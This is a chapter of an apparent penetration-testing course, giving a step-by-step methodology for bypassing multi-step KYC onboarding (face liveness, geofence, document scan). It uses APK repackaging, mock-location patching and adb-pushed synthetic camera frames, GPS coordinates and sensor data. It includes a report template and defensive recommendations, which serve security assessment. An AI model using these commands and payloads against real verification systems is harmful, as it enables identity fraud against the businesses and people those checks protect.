---
title: "Full Engagement"
description: "Running a coordinated multi-step bypass against a complete KYC onboarding flow"
---

> **Ethics Note:** This chapter describes a coordinated attack against multi-step identity verification flows. These techniques are powerful -- combined, they can fully bypass real-world onboarding systems. Use them only within the scope of an authorized engagement. Every technique here should be documented, every step evidenced, and every finding reported to the application owner. If you have not read Chapter 2 on rules of engagement, stop and go back now.

You know how to recon an APK. You know how to patch it. You know how to inject camera frames, spoof GPS coordinates, and fake sensor readings. Each of those is a capability -- a tool in the kit, a technique you have practiced against a single-purpose target. Individually, they are demonstrations. Combined, they are an operation.

A real engagement is not one attack surface at a time. It is a multi-step verification flow -- the kind of onboarding pipeline that banking, fintech, insurance, and government applications use to verify new users. The app walks the user through face capture, then an active liveness challenge, then document OCR, then location verification -- each step gated on the previous one, each step consuming data from different sources. Camera for the face. Camera again for the document, but different frames. Accelerometer and gyroscope for the liveness correlation. GPS for the geofence. Some apps layer on more: NFC for passport chip reading, microphone for voice verification, ambient light for environment validation.

Each step uses a different combination of your hooks. Each step requires different payloads. And you need to move through the flow seamlessly -- switching frame sources between face and document, hot-reloading sensor configs when the liveness challenge changes, maintaining GPS coordinates throughout -- all while capturing evidence at every stage and monitoring delivery rates to confirm your data was accepted.

The app thinks a real person is holding a real phone in a real place, looking at a real camera, tilting the device as instructed. In reality, every piece of data in the pipeline is synthetic -- constructed by you, delivered through bytecode-level hooks, consumed without question.

This chapter teaches you the operational methodology: how to plan, prepare, execute, and report a complete engagement against a multi-step target. From first APK pull to final remediation recommendations, this is the full cycle.

---

## The Four Phases

Every engagement follows the same structure. This is not a suggestion -- it is the process. Skip a phase and you will waste time, miss evidence you needed, or deliver incomplete findings.

```text
Phase 1: RECON
  Pull APK -> decode -> map hook surfaces -> plan the attack

Phase 2: PREPARE
  Patch APK -> install -> grant permissions -> prepare payloads -> push to device

Phase 3: EXECUTE
  Launch -> enable injection -> walk through target flow -> pass all checks

Phase 4: REPORT
  Export delivery log -> capture evidence -> write findings -> deliver recommendations
```

The flow is sequential and the dependencies are strict. You cannot prepare payloads without knowing what the recon revealed. You cannot execute cleanly without having everything staged. You cannot report without evidence captured during execution. Each phase feeds the next.

> **Why each phase matters:** Skip RECON and you will push CameraX frames at a Camera2 target. Skip PREPARE and you will lose time granting permissions mid-flow while the SDK times out. Skip EXECUTE's evidence capture and your report has no proof. Skip REPORT and the engagement never happened -- there is no deliverable. The discipline of following all four phases, every time, is what separates a professional assessment from an ad hoc hack session.

Some engagements are simple -- a single liveness check, one camera API, no location gate. The four phases still apply. They just move faster. Other engagements are complex -- multiple verification steps, multiple camera APIs, active liveness with sensor correlation, geofencing with mock detection, SDK integrity checks. The four phases still apply. They just take longer. The structure is constant. The complexity varies.

---

## Phase 1: Recon

Chapter 5 taught you how to pull and decode an APK, map hook surfaces, and identify SDKs. That was recon in isolation -- cataloguing what you found for understanding. Now you are doing it for real, against a target with multiple attack surfaces, and the difference is critical: you are not just cataloguing. You are planning a sequence of operations. Every finding drives a decision about what to prepare, what to stage, and what to expect during execution.

### Pull and Decode

Start with the APK on your workstation. If you are testing the practice target, you already have it. For a real engagement, pull from the device or obtain from a mirror:

```bash
# From a device
adb shell pm path com.example.targetapp
adb pull /data/app/~~abc123==/com.example.targetapp-xyz789==/base.apk target.apk

# Decode
apktool d target.apk -o decoded/
```

For the practice target:

```bash
apktool d course-1/targets/target-kyc-basic.apk -o decoded/
```

The decoded directory is your intelligence source for the rest of the engagement. Keep it around -- you will come back to it when things go wrong during execution.

### Map Every Hook Surface

Run all the searches. Every one of them. Do not skip the ones you "probably don't need." A multi-step target might use CameraX for the selfie, Camera2 for the document scan, and have a sensor check you did not expect. The searches take seconds. The time you save by not debugging a missed surface during execution is worth it.

```bash
# Camera -- both APIs
grep -rl "ImageAnalysis\$Analyzer\|ImageProxy\|OnImageAvailableListener" decoded/smali*/

# Location -- all callback styles
grep -rn "onLocationResult\|onLocationChanged\|getLastKnownLocation" decoded/smali*/

# Sensors
grep -rn "onSensorChanged" decoded/smali*/

# Mock detection -- all variants
grep -rn "isFromMockProvider\|isMock" decoded/smali*/

# Settings-based mock detection
grep -rn "mock_location" decoded/smali*/
```

Record every hit. Note the file path -- it tells you which class and which SDK is using that API. A hit in `com/poc/biometric/ui/CameraFragment.smali` means the app's own code handles the camera. A hit in a third-party SDK package means a commercial liveness SDK is the actual consumer. Both are hooked -- the hooks operate at the API level, not the SDK level -- but knowing which SDK you are dealing with tells you what kind of liveness challenge to expect and how sophisticated the analysis will be.

### Dig for Target-Specific Intelligence

This is the operational recon that goes beyond the standard hook surface scan. You are looking for hardcoded values, geofence coordinates, challenge types, timeout thresholds -- anything that tells you what payloads to prepare and what behavior to expect during execution.

```bash
# Geofence coordinates (often hardcoded in strings or config files)
grep -rn "latitude\|longitude\|geofence\|LatLng" decoded/smali*/
grep -rn "latitude\|longitude" decoded/res/values/strings.xml

# Liveness challenge types (tells you which frame sequences and sensor profiles you need)
grep -rn "tilt\|nod\|blink\|smile\|turn" decoded/smali*/

# Timeout values (how long you have to complete each step)
grep -rn "timeout\|TIMEOUT\|timer\|countdown" decoded/smali*/

# Third-party liveness/verification SDKs
grep -rn "liveness\|verification\|biometric\|identity" decoded/smali*/
```

If you find hardcoded coordinates -- say `40.7580, -73.9855` -- that is your geofence target. Those exact coordinates go in your location config. If you find strings like `"TILT_LEFT"`, `"TILT_RIGHT"`, `"NOD"` -- those are the active liveness challenges you need frame sequences and sensor configs for. If you find a timeout of 30 seconds, you know your window for completing each step.

### How Recon Findings Drive the Operation

Every recon finding maps directly to a preparation step. This is not abstract -- it is mechanical. Build a table:

| Recon Finding | Preparation Action |
|--------------|-------------------|
| CameraX `ImageAnalysis$Analyzer` found | Prepare face frames at 640x480 PNG |
| `onLocationResult` in app code | Prepare location config JSON |
| `onSensorChanged` registered | Prepare sensor config (holding profile minimum) |
| `isFromMockProvider` called | Verify patch-tool neutralizes it (check patch output) |
| Geofence at 40.758, -73.985 | Use those exact coordinates in location config |
| Active liveness: TILT_LEFT, TILT_RIGHT | Prepare tilt frame sequences and sensor profiles |
| 30-second timeout on liveness step | Script sensor switching or practice the manual sequence |

If recon reveals something unexpected -- an API you have not seen before, an integrity check you did not anticipate, a custom camera implementation -- that is the moment to investigate further, not during execution when the clock is running. Decode the relevant smali, trace the call graph, understand what data flows where. The time spent in recon pays for itself tenfold during execution.

### What to Do When Recon Reveals Unexpected Surfaces

Not every target fits the standard model. You might find:

- **Both CameraX and Camera2 in the same app.** The selfie step might use CameraX while the document scanner uses Camera2. The patch-tool hooks both, but you need to verify both sets of hooks fire during execution. Your logcat filter needs both tags.

- **Custom camera implementations.** Some apps wrap the camera APIs in abstraction layers. The hooks still work -- they target the Android API methods, not the wrapper -- but the call stack in logcat might look different from what you expected.

- **No sensor listeners.** The app might not cross-check sensors at all. That simplifies your operation -- no sensor payloads needed, one less thing to coordinate. But confirm this during execution by watching logcat for the absence of sensor hook activity.

- **Proprietary anti-spoofing SDKs.** If you find classes from anti-fraud vendors (device fingerprinting, behavioral biometrics), document them in your recon report. They may not affect the hook-level bypass, but they represent additional defense layers the client should know about.

### Write the Attack Plan

Not a formal document -- a checklist of what you need, derived directly from your recon findings:

- [ ] Camera API: CameraX / Camera2 / Both
- [ ] Location API: FusedLocationProvider / LocationManager / Both
- [ ] Sensor types: Accelerometer / Gyroscope / None detected
- [ ] Liveness type: Passive / Active (list specific challenges)
- [ ] Geofence coordinates: (lat, lng) or none
- [ ] Mock detection: isFromMockProvider / isMock / Settings.Secure / none
- [ ] Payloads needed: face frames, document frames, location config, sensor configs
- [ ] Expected flow steps: (list each verification step in order)

This checklist becomes the skeleton of your engagement report. Fill it in now with recon data. Fill in the results after execution.

---

## Phase 2: Prepare

Preparation is the phase most operators want to rush through. They have their recon, they know the target, they want to start breaking things. Resist the urge. Every minute spent in preparation saves five during execution. A missing permission, an unpushed payload, a misconfigured coordinate -- any of these will stall you mid-flow while the SDK times out and forces a restart.

The goal of this phase is simple: when you launch the patched app, every data source it queries from its very first API call returns your data. No race conditions. No manual intervention. No scrambling to push files while a liveness countdown ticks.

### Patch the APK

```bash
# Run from the project root (where patch-tool.jar lives)
java -jar patch-tool.jar target.apk --out patched.apk --work-dir ./work 2>&1 | tee patch_output.txt
```

The `tee` command writes to both the screen and a file simultaneously. You watch the output in real time and keep a saved copy for your report. This output is evidence -- it documents exactly which hooks were applied, which surfaces were found, and which were skipped.

For the practice target:

```bash
java -jar patch-tool.jar course-1/targets/target-kyc-basic.apk \
  --out patched.apk --work-dir ./work 2>&1 | tee patch_output.txt
```

### Cross-Referencing Patch Output with Recon

This is a step most operators skip, and it costs them. The patch-tool output tells you exactly which hooks it applied. Compare that against your recon findings:

| Recon Found | Patch Applied? | Status |
|------------|---------------|--------|
| CameraX `analyze()` | Yes -- `FrameInterceptor` injected | Good |
| `onLocationResult` | Yes -- `LocationInterceptor` injected | Good |
| `onSensorChanged` | No -- "Not found in target" | Investigate |
| `isFromMockProvider` | Yes -- patched to return `false` | Good |

If the patch-tool skipped a surface your recon identified, investigate. Common explanations:

- **The code exists but is in a library JAR, not in smali.** Some SDKs ship as pre-compiled libraries that apktool does not decode.
- **The method signature differs slightly from what the patch-tool expects.** Version differences in the SDK can cause this.
- **The code path is dead code -- present in the APK but never actually called.** This happens more than you would think.

If the patch-tool applied hooks your recon did not identify, that is also useful information -- the tool scanned more broadly than your manual grep and found surfaces in obfuscated or nested code.

### Install and Grant Permissions

Install the patched APK and grant every permission up front. Do not wait for permission dialogs during the flow -- they interrupt the timing and some SDKs interpret the interruption as a failure.

```bash
# Clean install (remove any previous version)
adb uninstall com.poc.biometric 2>/dev/null
adb install -r patched.apk

# Grant all permissions the app needs
adb shell pm grant com.poc.biometric android.permission.CAMERA
adb shell pm grant com.poc.biometric android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.poc.biometric android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.poc.biometric android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.poc.biometric android.permission.WRITE_EXTERNAL_STORAGE

# API 30+ scoped storage override
adb shell appops set com.poc.biometric MANAGE_EXTERNAL_STORAGE allow
```

For a real engagement, replace `com.poc.biometric` with your target's package name and add whatever permissions it declares in its manifest. Check the manifest if you are unsure:

```bash
grep "uses-permission" decoded/AndroidManifest.xml
```

### Prepare and Push All Payloads

Get everything on the device before you launch. All three subsystems auto-enable from their directories. When the app starts, every injection is armed from the first frame, the first location query, the first sensor read.

**Camera payloads:**

```bash
# Face frames for liveness step
adb push payloads/frames/face_neutral/ /sdcard/poc_frames/face_neutral/

# Document frames for OCR step (if the flow has one)
adb push payloads/frames/id_card/ /sdcard/poc_frames/id_card/
```

If you need to generate frames from video source material:

```bash
# Extract frames at 15fps, scaled to 640x480
ffmpeg -i selfie.mp4 -vf "fps=15,scale=640:480" face_neutral/%03d.png

# For document images, a single high-quality photo is usually sufficient
# Scale to match the camera resolution the app expects
convert id_front.jpg -resize 640x480 id_card/001.png
```

**Location config:**

```bash
# Use the exact coordinates from recon
cat > location_config.json << 'EOF'
{
  "latitude": 40.7580,
  "longitude": -73.9855,
  "altitude": 5.0,
  "accuracy": 8.0
}
EOF
adb push location_config.json /sdcard/poc_location/config.json
```

**Sensor config:**

```bash
# HOLDING profile for the face scan step (person holding phone at selfie angle)
cat > sensor_config.json << 'EOF'
{
  "accelX": 0.1,
  "accelY": 9.5,
  "accelZ": 2.5,
  "gyroX": 0.0,
  "gyroY": 0.0,
  "gyroZ": 0.0,
  "magX": 0.0,
  "magY": 25.0,
  "magZ": -45.0,
  "jitter": 0.15
}
EOF
adb push sensor_config.json /sdcard/poc_sensor/config.json
```

### The Pre-Staging Strategy

Why does everything go on the device before launch? Three reasons:

1. **Timing.** The interceptors check for payload directories during `Application.onCreate()`. If the directories exist and contain data at launch time, injection arms immediately. If you push payloads after launch, there is a window where the app queries real data before your fakes are in place. For camera frames, that means the liveness SDK might see a real frame (your desk, your ceiling) before seeing your injected face -- and some SDKs flag the sudden transition.

2. **Atomicity.** If all three payload types are present at launch, all three subsystems activate simultaneously. The very first camera frame, the very first location callback, the very first sensor event -- all synthetic, all consistent, all from the same moment. No mixed signals.

3. **Simplicity.** Once everything is staged, execution is a matter of launching the app and walking through the flow. You are free to focus on timing, screenshots, and logcat monitoring rather than scrambling to push files.

The only exception is when you need to switch payloads mid-flow (different frames for different steps). Even then, pre-load all frame sets into separate subdirectories before launch and switch between them during execution -- do not generate or transfer new files mid-operation.

---

## Phase 3: Execute

Everything is staged. Payloads are on the device. Permissions are granted. The patched APK is installed. Now you run the operation.

### Start the Evidence Capture

Before you launch the app, start recording. You need the delivery log for your report. This is non-negotiable -- start it before the app touches anything.

```bash
# Clear any stale logcat data
adb logcat -c

# In a separate terminal -- capture all injection events
adb logcat -s FrameInterceptor,LocationInterceptor,SensorInterceptor,HookEngine,DeliveryTracker > delivery_log.txt &
LOGCAT_PID=$!
```

The `&` sends the logcat process to the background. The `$!` captures its PID so you can kill it later. Every injection event, every delivery, every hook invocation is now being recorded to a file.

If you want to watch the log in real time while also saving it:

```bash
adb logcat -s FrameInterceptor,LocationInterceptor,SensorInterceptor | tee delivery_log.txt &
LOGCAT_PID=$!
```

### Launch

```bash
adb shell am start -n com.poc.biometric/com.poc.biometric.ui.LauncherActivity
```

All three injections auto-enable. The face frames are active. The GPS coordinates are locked. The sensor profile is running. The app starts, and from its first moment, every data source it queries returns your data.

Watch logcat for the initial confirmation messages:

```text
D HookEngine: FrameInterceptor armed, folder=face_neutral, frames=47
D HookEngine: LocationInterceptor armed, config=config.json
D HookEngine: SensorInterceptor armed, jitter=0.15
```

If any subsystem does not arm, check that the payload directory exists and is not empty. A missing directory means the interceptor stays dormant -- by design.

### Walking Through the Flow

A typical multi-step KYC onboarding proceeds through three to five verification steps, each consuming data from different sources. Here is how to handle each common step type.

**Step 1: Face Capture / Liveness**

Frame injection is already active with `face_neutral/`. The sensor interceptor is running the holding profile -- accelerometer values consistent with a person holding a phone at selfie distance. The liveness SDK sees your face frames and detects natural hand tremor in the accelerometer data. It runs its checks.

If it is passive liveness -- no user interaction required, just "hold still and look at the camera" -- you wait. The SDK processes your frames, checks them against its model, and renders a verdict. Watch logcat for `FRAME_CONSUMED` events to confirm the SDK is accepting your frames.

If it is active liveness -- "tilt your head left," "nod," "blink" -- you need to coordinate. The camera frames need to show the requested action, and the sensor config needs to match the motion. This is the most timing-sensitive part of the engagement.

For active liveness challenges, switch sensor configs as the prompts appear:

```bash
# SDK says "tilt left"
adb push payloads/sensors/tilt-left.json /sdcard/poc_sensor/config.json
# The interceptor picks up the new config within 2 seconds

# SDK says "tilt right"
adb push payloads/sensors/tilt-right.json /sdcard/poc_sensor/config.json

# SDK says "nod"
adb push payloads/sensors/nod.json /sdcard/poc_sensor/config.json

# When the challenge completes, return to holding
adb push payloads/sensors/holding.json /sdcard/poc_sensor/config.json
```

The timing does not need to be millisecond-precise. Most liveness SDKs give the user several seconds to complete each action, and the sensor config hot-reload happens within one to two seconds of the file push. You have a comfortable window.

Capture evidence after each step:

```bash
adb exec-out screencap -p > step1_face.png
```

**Step 2: Location Verification**

Location injection has been active since launch. Your coordinates are being delivered on every location callback. The geofence check passes because your coordinates are inside the target zone. Mock detection is bypassed -- `isFromMockProvider()` returns `false`, `isMock()` returns `false`, the Settings.Secure check returns `"0"`.

This step is usually the simplest during execution because location injection is purely passive -- there is nothing to switch or coordinate. The coordinates are delivered continuously and automatically. Just navigate to the location verification screen and let it pass.

```bash
adb exec-out screencap -p > step2_location.png
```

If the location step involves continuous monitoring ("stay in the area for 30 seconds"), the accuracy jitter built into the LocationInterceptor handles it. Each delivery has slight coordinate variation that mimics real GPS drift. A perfectly static coordinate would be suspicious -- the jitter makes it look natural.

**Step 3: Document Scan**

Now you need to switch frame sources. The camera should show your ID document instead of a face. Two approaches, depending on whether you are operating interactively or headlessly.

**Via overlay (interactive):** If the runtime overlay is visible (the lightning bolt icon), tap it to open the control panel. Use the folder browser to switch from `face_neutral/` to `id_card/`. The frame source changes immediately.

**Via adb (headless or scripted):**

```bash
# Remove current frames and push document frames
adb shell rm -rf /sdcard/poc_frames/*
adb push payloads/frames/id_card/ /sdcard/poc_frames/id_card/
```

The runtime picks up the new frames on its next cycle. The OCR SDK processes your injected document image. Watch logcat for `FRAME_DELIVERED` events referencing the new folder to confirm the switch.

Also switch the sensor config to a still profile -- the phone is presumably propped up or held steady while the user positions a document:

```bash
adb push payloads/sensors/still.json /sdcard/poc_sensor/config.json
```

```bash
adb exec-out screencap -p > step3_document.png
```

### Timing Considerations

Several timing factors affect execution:

- **SDK timeouts.** Many liveness SDKs impose a time limit -- typically 15 to 60 seconds per step. If you are manually switching sensor configs for active liveness, practice the sequence beforehand so you can execute it within the timeout window. If the timeout is tight, script the switches.

- **Frame delivery rate.** The camera frame interceptor delivers frames at the rate the app requests them -- typically 15 to 30 fps for analysis, lower for capture. Your frame folder needs enough frames to sustain the delivery. A folder with 5 frames will loop every third of a second at 15 fps. A folder with 45 frames will loop every 3 seconds. More frames means a more natural-looking sequence.

- **Config hot-reload latency.** Sensor and location configs hot-reload within 1 to 2 seconds of the file being written. Factor this into your active liveness timing. Push the sensor config slightly before you expect the challenge to begin, not after you see the prompt.

- **Step transitions.** When the app transitions between verification steps (face to location to document), there is usually a loading screen or intermediate UI. Use this time to switch payloads. The transition buys you 2 to 5 seconds, which is enough for an adb push.

### Recovery When a Step Fails

Steps fail. The liveness SDK rejects your frames. The geofence radius is tighter than expected. The document OCR cannot read your injected image. This is normal -- it is why you iterate.

When a step fails, do not restart from scratch. Diagnose first:

```bash
# Check what happened in the last 30 seconds of logcat
tail -50 delivery_log.txt
```

Common failures and their fixes:

| Symptom | Likely Cause | Fix |
|---------|-------------|-----|
| No FRAME_DELIVERED events | Frame directory empty or missing | Check `/sdcard/poc_frames/` contents |
| FRAME_DELIVERED but SDK rejects | Frame quality insufficient | Use higher-quality source material, check resolution |
| Liveness fails despite frames accepted | Sensor mismatch -- frames show motion, sensors say still | Push matching sensor config |
| Location check fails | Coordinates outside geofence radius | Re-check recon for exact bounds, tighten coordinates |
| Mock detected despite patches | Non-standard mock detection (proprietary SDK) | Check patch output for missed surfaces |
| SDK timeout before completion | Too slow switching payloads | Script the payload switches, practice the sequence |

Kill the app, adjust the problematic payload, and relaunch:

```bash
adb shell am force-stop com.poc.biometric
# Fix the problem (adjust payloads, push new configs)
adb shell am start -n com.poc.biometric/com.poc.biometric.ui.LauncherActivity
```

The hooks are still armed. The patched APK does not change. Only your payloads change. Iterate as many times as you need. Each attempt generates more logcat data, which gives you more information about what the SDK expects.

### Stop the Evidence Capture

Once you have completed the flow (or determined you have enough data to report):

```bash
kill $LOGCAT_PID
```

Your `delivery_log.txt` now contains the complete record of every injection event during the engagement.

---

## Phase 4: Report

The bypass is the means. The report is the end. Without a report, the engagement never happened -- there is no deliverable, no findings, no recommendations, no value to the client. A flawless multi-step bypass that nobody documents is just a party trick.

### Extract Delivery Statistics

**Option A: Export the structured delivery log.** The runtime includes a `DeliveryTracker` that records every injection event with timestamps. Export it:

```bash
# Trigger the export
adb logcat -c && adb shell "am broadcast -a com.hookengine.EXPORT_LOG" 2>/dev/null
# Wait for the broadcast to process
sleep 2

# Pull the structured log
adb pull /sdcard/poc_logs/delivery.log .
cat delivery.log
```

The exported log contains a summary section with totals and accept rates for all three subsystems, plus a recent events section with timestamped entries:

```text
=== HookEngine Delivery Log ===
Exported: 2025-03-15 14:23:45

--- Summary ---
Frame:    delivered=47 consumed=45 rate=45/47
Location: delivered=12 callback=12 listener=0 getLast=3 rate=15/12
Sensor:   delivered=89 listener=89 rate=89/89

--- Recent Events ---
[14:23:44.123] FRAME_DELIVERED idx=23 folder=face_neutral
[14:23:44.125] FRAME_CONSUMED toBitmap
[14:23:44.340] SENSOR_DELIVERED ACCEL 0.12,0.18,9.79
[14:23:44.341] SENSOR_LISTENER_HIT onSensorChanged
...
```

**Option B: Parse from logcat.** If the broadcast-based export is not available (older runtime builds or permissions issues), extract statistics from the logcat stream you captured:

```bash
echo "=== Delivery Statistics ==="
echo "Frames delivered:    $(grep -c 'FRAME_DELIVERED' delivery_log.txt)"
echo "Frames consumed:     $(grep -c 'FRAME_CONSUMED' delivery_log.txt)"
echo "Frames analyzed:     $(grep -c 'FRAME_ANALYZE_ENTER' delivery_log.txt)"
echo "Frames captured:     $(grep -c 'FRAME_CAPTURE' delivery_log.txt)"
echo "Locations delivered:  $(grep -c 'LOCATION_DELIVERED' delivery_log.txt)"
echo "Location callbacks:   $(grep -c 'LOCATION_CALLBACK_HIT' delivery_log.txt)"
echo "Sensor events:       $(grep -c 'SENSOR_DELIVERED' delivery_log.txt)"
echo "Sensor listeners:    $(grep -c 'SENSOR_LISTENER_HIT' delivery_log.txt)"
```

The ratio of DELIVERED to CONSUMED is your accept rate. If you delivered 47 frames and 45 were consumed, that is a 95.7% accept rate -- the SDK accepted almost everything you sent. The two missed frames were likely delivered during a screen transition when no analyzer was active.

### The 10 Event Types

The delivery tracker records 10 distinct event types across the three subsystems. Understanding each one matters for interpreting your results and for explaining your findings in the report.

| Event | Subsystem | Meaning |
|-------|-----------|---------|
| `FRAME_DELIVERED` | Camera | A fake frame was injected into the pipeline |
| `FRAME_CONSUMED` | Camera | `toBitmap()` was called on the FakeImageProxy |
| `FRAME_ANALYZE_ENTER` | Camera | The app's `analyze()` method was entered with the fake frame |
| `FRAME_CAPTURE` | Camera | An ImageCapture callback fired with the fake frame |
| `LOCATION_DELIVERED` | Location | A fake Location object was constructed and returned |
| `LOCATION_CALLBACK_HIT` | Location | `onLocationResult` fired with fake coordinates |
| `LOCATION_LISTENER_HIT` | Location | `onLocationChanged` fired with fake coordinates |
| `LOCATION_GETLAST_HIT` | Location | `getLastKnownLocation` returned fake coordinates |
| `SENSOR_DELIVERED` | Sensor | Fake sensor values were injected into a SensorEvent |
| `SENSOR_LISTENER_HIT` | Sensor | `onSensorChanged` fired with fake values |

A few patterns to look for in the data:

- **FRAME_DELIVERED >> FRAME_CONSUMED:** Frames are being delivered faster than the SDK processes them. This is normal -- the camera runs at 30 fps but the SDK might only process every other frame.
- **LOCATION_DELIVERED with zero LOCATION_CALLBACK_HIT:** The app uses direct queries (`getLastLocation`) but not continuous callbacks. Adjust your understanding of the app's location model.
- **SENSOR_DELIVERED with zero SENSOR_LISTENER_HIT:** The app registers a listener but it never fires with your data. This could indicate the sensor type is wrong -- the app listens for gyroscope but you are only injecting accelerometer.

### The Engagement Report Template

This is your deliverable. It proves what you did, what worked, and what the target should fix.

```markdown
# Engagement Report

## Target
- **Application:** <app name>
- **Package:** <package name>
- **Version:** <version>
- **Date:** <date>
- **Tester:** <your name>
- **Authorization:** <reference to scope document>

## Recon Summary
- **Camera API:** CameraX / Camera2 / Both
- **Location API:** FusedLocationProvider / LocationManager / Both
- **Sensors:** Accelerometer / Gyroscope / Both / None
- **Liveness type:** Passive / Active (tilt/nod/blink) / None
- **Geofence:** Yes (lat, lng, radius) / No
- **Mock detection:** isFromMockProvider / isMock / Settings.Secure / None
- **Notable SDKs:** <list any third-party verification SDKs identified>

## Hooks Applied
(paste patch-tool output from patch_output.txt)

## Payloads Used
- **Camera frames:** <folder/file, frame count, resolution>
- **Location config:** <coordinates, accuracy>
- **Sensor config:** <profile name or custom values>

## Results

### Step 1: Face Capture / Liveness
- **Result:** PASS / FAIL
- **Frames delivered:** <count>
- **Frames consumed:** <count>
- **Accept rate:** <percentage>
- **Sensor profile used:** <profile>
- **Notes:** <observations>

### Step 2: Location Verification
- **Result:** PASS / FAIL
- **Locations delivered:** <count>
- **Mock detection bypassed:** Yes / No
- **Notes:** <observations>

### Step 3: Document Scan
- **Result:** PASS / FAIL
- **Frames delivered:** <count>
- **Notes:** <observations>

## Overall Result
- **Engagement outcome:** FULL BYPASS / PARTIAL / FAILED
- **All onboarding steps completed with injected data:** Yes / No

## Delivery Statistics
(paste output from delivery statistics extraction)

## Evidence
- `delivery_log.txt` -- full delivery log
- `delivery.log` -- structured delivery export
- `step1_face.png` -- screenshot of face check pass
- `step2_location.png` -- screenshot of geofence pass
- `step3_document.png` -- screenshot of document scan pass
- `patch_output.txt` -- patch-tool console output

## Recommendations
(see below)
```

### The Recommendations Section

The recommendations section is what transforms a red team exercise into value for the client. This is the difference between "we broke your app" and "here's how to make it resistant to this class of attack." Do not just say "we bypassed it." Say what should have been different. Be specific, be actionable, and prioritize by impact.

**Server-side liveness verification.** The single highest-impact mitigation. If the liveness decision is made server-side using challenge-response protocols -- where the server generates a unique, unpredictable challenge and validates the response with its own analysis -- client-side frame injection alone cannot bypass it. The server sees the raw frames, runs its own ML models, and makes the accept/reject decision independently of any client-side code. This is the recommendation that belongs at the top of every report.

**APK integrity checks.** Runtime verification that the APK signature matches the expected production key. Detects repackaging -- which is the prerequisite for all hook injection. Can be bypassed with additional effort, but raises the bar significantly and adds detectable indicators that the app has been tampered with.

**Certificate pinning on SDK API calls.** If the liveness SDK communicates with a backend, pinning the TLS certificate prevents interception and replay of the challenge-response flow. Without pinning, an attacker could potentially intercept the server-side liveness protocol and replay a legitimate session.

**Frame sequence entropy analysis.** Detecting that injected frames have unnaturally low entropy, repetitive patterns, or identical timestamps. Static frames or short loops are detectable with statistical analysis. A 5-frame loop repeating at 15 fps produces a perfectly periodic signal that no real camera produces.

**Sensor plausibility validation.** Checking that the gravity magnitude stays near 9.81, that accelerometer and gyroscope values are physically consistent, that sensor timestamps advance monotonically. This toolkit passes these checks because it models the physics correctly -- but the recommendation is still valid because it catches naive spoofing tools and raises the technical bar.

**Device attestation.** SafetyNet or Play Integrity API checks that verify device integrity and detect repackaged APKs. Not bulletproof -- rooted devices and custom ROMs can sometimes satisfy attestation -- but a meaningful layer that adds cost and complexity to the attack.

Every recommendation should include what it defends against, how hard it is to implement, and whether this toolkit's techniques would still work against it. That level of specificity is what makes a report worth reading and what justifies the security investment the client needs to make.

---

## The Engagement Checklist

Print this. Use it on every engagement. Check every box.

```text
RECON
[ ] Obtain target APK (pull from device or download)
[ ] Decode with apktool
[ ] Identify Application class
[ ] Identify launcher Activity
[ ] Map camera hook surfaces (CameraX / Camera2)
[ ] Map location hook surfaces (FusedLocation / LocationManager)
[ ] Map sensor hook surfaces (onSensorChanged)
[ ] Scan for mock detection (isFromMockProvider / isMock / Settings)
[ ] Identify geofence coordinates (if applicable)
[ ] Identify liveness challenge type (passive / active)
[ ] Identify third-party SDKs
[ ] Note timeout values
[ ] Document findings in attack plan

PREPARE
[ ] Patch APK with patch-tool (save output with tee)
[ ] Cross-reference patch output with recon findings
[ ] Verify expected hooks were applied
[ ] Install patched APK on device
[ ] Grant all permissions (camera, location, storage)
[ ] Prepare camera payloads:
    [ ] Face frames for liveness step
    [ ] Document images for OCR step
    [ ] Additional frame sets as needed
[ ] Prepare location config with target coordinates
[ ] Prepare sensor config (holding profile minimum)
[ ] Prepare additional sensor profiles for active liveness
[ ] Push ALL payloads to device before launch
[ ] Verify payload directories are populated

EXECUTE
[ ] Clear logcat buffer
[ ] Start logcat capture to file (background)
[ ] Launch the patched app
[ ] Verify all injections armed (check logcat for arm messages)
[ ] Complete each step of the target flow:
    [ ] Step 1: ____________ -> Result: ____
    [ ] Step 2: ____________ -> Result: ____
    [ ] Step 3: ____________ -> Result: ____
    [ ] Step N: ____________ -> Result: ____
[ ] Screenshot at each step
[ ] Switch payloads between steps as needed
[ ] Stop logcat capture

REPORT
[ ] Export delivery statistics (broadcast or logcat parse)
[ ] Calculate accept rates for each subsystem
[ ] Compile evidence (screenshots + logs + patch output)
[ ] Write engagement report using template
[ ] Include recon summary
[ ] Include delivery statistics with event type breakdown
[ ] Include step-by-step results with evidence
[ ] Write recommendations section
[ ] Review report for completeness
```

---

## Operational Notes

### Switching Payloads Between Steps

Multi-step flows require different frames for different steps. Two approaches:

**Option A: Pre-load all folders, switch via overlay.** Push all frame sets before launch. Each set goes in its own subdirectory under `/sdcard/poc_frames/`. Use the overlay's folder browser to switch between `face_neutral/`, `id_card/`, `barcode/` as you move through the flow. This is best for interactive operation where you are watching the screen and can tap the overlay at the right moment.

```bash
# Pre-load everything before launch
adb push face_neutral/ /sdcard/poc_frames/face_neutral/
adb push id_card/ /sdcard/poc_frames/id_card/
adb push barcode/ /sdcard/poc_frames/barcode/
```

**Option B: Replace frames via adb between steps.** Best for scripted or headless operation where no human is interacting with the device screen.

```bash
# Step 1: face
adb shell rm -rf /sdcard/poc_frames/*
adb push face_neutral/ /sdcard/poc_frames/face_neutral/

# (complete step 1)

# Step 2: document
adb shell rm -rf /sdcard/poc_frames/*
adb push id_card/ /sdcard/poc_frames/id_card/
```

The tradeoff: Option A is faster (no file transfer between steps) but requires manual interaction. Option B is automatable but has a brief gap during the rm/push sequence where no frames are available. Time the switch during a screen transition or loading state to avoid delivering a blank frame.

### Timing and Coordination

All three subsystems -- camera, location, sensor -- are independent. They arm independently, deliver independently, and can be reconfigured independently. There is no coordination required between them. This is by design: location stays constant while camera frames change; sensor profiles change while location remains locked; camera frames can switch while sensors hold steady.

The only coordination you need is between your camera frames and your sensor config. If the camera shows a face tilting left, the sensor config should show corresponding rotation. If the camera shows a static document, the sensor config should show a still phone. Chapter 7 covered frame preparation; Chapter 9 covered sensor profile matching. The coordination happens in your payload preparation, not at runtime.

### When a Step Fails: Diagnosis from Logcat

Logcat is your primary diagnostic tool. When something goes wrong, the answer is almost always in the log. Here is how to read it:

**Check hook invocation.** Search for the relevant tag:

```bash
grep "FrameInterceptor" delivery_log.txt | tail -20
grep "LocationInterceptor" delivery_log.txt | tail -20
grep "SensorInterceptor" delivery_log.txt | tail -20
```

